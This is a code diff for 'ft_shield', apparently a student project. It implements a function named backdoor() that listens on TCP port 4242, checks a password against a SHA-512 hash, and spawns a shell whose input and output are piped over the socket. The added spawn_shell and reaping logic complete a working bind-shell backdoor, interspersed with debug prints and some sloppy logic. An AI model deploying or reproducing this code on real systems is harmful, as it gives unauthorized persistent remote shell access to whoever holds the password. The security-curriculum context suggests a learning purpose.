@@ -1,9 +1,20 @@
 #include "ft_shield.h"
 
+#include <sys/wait.h>
+t_serv		serv;
+
 void	reset_client(t_client *client)
 {
+	close(client->fd);
+	if (client->shell_pid >= 0)
+		kill(client->shell_pid, SIGINT);
+	if (client->supervisor_pid >= 0)
+		kill(client->supervisor_pid, SIGINT);
 	client->fd = -1;
 	client->logged = false;
+	client->fd_shell = -1;
+	client->shell_pid = -1;
+	client->supervisor_pid = -1;
 }
 
 void	remove_client(t_serv *serv, int fd)
@@ -19,6 +30,39 @@ void	remove_client(t_serv *serv, int fd)
 		}
 	}
 	serv->nb_clients--;
+}
+;
+void	zombie_hunter(int sig)
+{
+	(void)sig;
+	int status;
+	pid_t pid = wait(&status);
+	t_client *client = NULL;
+	for (int i = 0; i < MAX_CLIENTS; i++)
+	{
+		if (serv.clients[i].shell_pid == pid)
+		{
+			client = &serv.clients[i];
+			break ;
+		}
+	}
+	if (client)
+	{
+		printf("%d\n", client->fd_shell);
+		close(client->fd_shell);
+		client->fd_shell = -1;
+		client->shell_pid = -1;
+		kill(client->supervisor_pid, SIGINT);
+		client->supervisor_pid = -1;
+		printf("%d\n", client->fd);
+		if (send_str(client->fd, "$> ") < 0)
+		{
+			printf("delete\n");
+			remove_client(&serv, client->fd);
+		}
+		printf("end\n");
+		remove_client(&serv, client->fd);
+	}
 }
 
 void	show_help(t_serv *serv, int fd)
@@ -47,14 +91,60 @@ void	logout(t_serv *serv, int fd)
 	for (int i = 0; i < MAX_CLIENTS; i++)
 	{
 		if (serv->clients[i].fd == fd)
+		{
 			serv->clients[i].logged = false;
+		}
 	}
 }
 
 void	spawn_shell(t_serv *serv, int fd)
 {
-	(void)serv;
-	(void)fd;
+	t_client *client = NULL;
+	for (int i = 0; i < MAX_CLIENTS; i++)
+	{
+		if (serv->clients[i].fd == fd)
+		{
+			client = &serv->clients[i];
+			break ;
+		}
+	}
+	if (!client)
+		return ;
+	int fds[2];
+	int fds_bis[2];
+	pipe(fds);
+	pipe(fds_bis);
+	client->shell_pid = fork();
+	if (!client->shell_pid)
+	{
+		dup2(fds_bis[READ_END], STDIN_FILENO);
+		dup2(fds[WRITE_END], STDERR_FILENO);
+		dup2(fds[WRITE_END], STDOUT_FILENO);
+		char *argv[] = {BIN_SHELL, NULL};
+
+		execve(argv[0], argv, NULL);
+		exit(0);
+	}
+	else if (client->shell_pid > 0)
+	{
+		client->fd_shell = fds_bis[WRITE_END];
+		client->supervisor_pid = fork();
+		if (!client->supervisor_pid)
+		{
+			char *buffer[BUFFER_SIZE];
+			int ret = 0;
+			while ((ret = read(fds[READ_END], buffer, BUFFER_SIZE)) >= 0)
+			{
+				if (send(fd, buffer, ret, 0) < 0)
+				{
+					remove_client(serv, fd);
+					break ;
+				}
+			}
+			kill(client->shell_pid, SIGKILL);
+			exit(0);
+		}
+	}
 }
 
 void	launch_command(t_serv *serv, int fd, char *cmd)
@@ -69,10 +159,8 @@ void	launch_command(t_serv *serv, int fd, char *cmd)
 	}
 }
 
-void	backdoor()
+void	backdoor(void)
 {
-	t_serv		serv;
-
 	bzero(&serv, sizeof(t_serv));
 	serv.port = 4242;
 	serv.sockfd = socket(PF_INET, SOCK_STREAM, 0);
@@ -89,8 +177,13 @@ void	backdoor()
 	FD_ZERO(&serv.fd_master);
 	FD_SET(serv.sockfd, &serv.fd_master);
 	for (int i = 0; i < MAX_CLIENTS; i++)
+	{
+		serv.clients[i].shell_pid = -1;
+		serv.clients[i].supervisor_pid = -1;
 		reset_client(&serv.clients[i]);
+	}
 	int fd_max = serv.sockfd;
+	signal(SIGCHLD,zombie_hunter);
 	while (true)
 	{
 		serv.fd_read = serv.fd_master;
@@ -119,6 +212,7 @@ void	backdoor()
 							{
 								serv.clients[i].fd = new_fd;
 								serv.clients[i].logged = false;
+								break ;
 							}
 						}
 						serv.nb_clients++;
@@ -135,9 +229,11 @@ void	backdoor()
 						remove_client(&serv, fd);
 					else
 					{
+						printf("client on fd -> %d\n", fd);
 						t_client *client = NULL;
 						for (int i = 0; i < MAX_CLIENTS; i++)
 						{
+							printf("%d\n", serv.clients[i].fd);
 							if (serv.clients[i].fd == fd)
 							{
 								client = &serv.clients[i];
@@ -146,61 +242,68 @@ void	backdoor()
 						}
 						if (client)
 						{
-							char *msg = buffer;
-							char *end = memchr(buffer, '\n', len_read);
-							if (!end)
-								end = buffer + len_read;
-							*end = '\0';
-							while (msg - buffer < len_read)
+							printf("client found !\n");
+							if (!client->logged || client->shell_pid == -1)
 							{
-								if (!client->logged)
-								{
-									char *hash = sha512(msg, strlen(msg));
-									if (!strcmp(hash, HASHED_PWD))
-									{
-										if (send_str(fd, "$> ") < 0)
-										{
-											remove_client(&serv, fd);
-											break ;
-										}
-										client->logged = true;
-									}
-									else
-									{
-										if (send_str(fd, "Password: ") < 0)
-										{
-											remove_client(&serv, fd);
-											break ;
-										}
-									}
-									free(hash);
-								}
-								else if (client->logged)
-								{
-									launch_command(&serv, fd, msg);
-									if (client->logged)
-									{
-										if (send_str(fd, "$> ") < 0)
-										{
-											remove_client(&serv, fd);
-											break ;
-										}
-									}
-									else
-									{
-										if (send_str(fd, "Password: ") < 0)
-										{
-											remove_client(&serv, fd);
-											break ;
-										}
-									}
-								}
-								msg += strlen(msg) + 1;
-								end = memchr(end + 1, '\n', len_read - (end - buffer));
+								printf("not logged !\n");
+								char *msg = buffer;
+								char *end = memchr(buffer, '\n', len_read);
 								if (!end)
 									end = buffer + len_read;
 								*end = '\0';
+								while (msg - buffer < len_read)
+								{
+									if (!client->logged)
+									{
+										char *hash = sha512(msg, strlen(msg));
+										if (!strcmp(hash, HASHED_PWD))
+										{
+											if (send_str(client->fd, "$> ") < 0)
+											{
+												remove_client(&serv, fd);
+												break ;
+											}
+											client->logged = true;
+										}
+										else
+										{
+											if (send_str(fd, "Password: ") < 0)
+											{
+												remove_client(&serv, fd);
+												break ;
+											}
+										}
+										free(hash);
+									}
+									else if (client->logged)
+									{
+										launch_command(&serv, fd, msg);
+										if (client->logged && client->shell_pid == -1)
+										{
+											if (send_str(fd, "$> ") < 0)
+											{
+												remove_client(&serv, fd);
+												break ;
+											}
+										}
+										else if (!client->logged)
+										{
+											if (send_str(fd, "Password: ") < 0)
+											{
+												remove_client(&serv, fd);
+												break ;
+											}
+										}
+									}
+									msg += strlen(msg) + 1;
+									end = memchr(end + 1, '\n', len_read - (end - buffer));
+									if (!end)
+										end = buffer + len_read;
+									*end = '\0';
+								}
 							}
+							else
+								write(client->fd_shell, buffer, len_read);
 						}
 					}
 				}
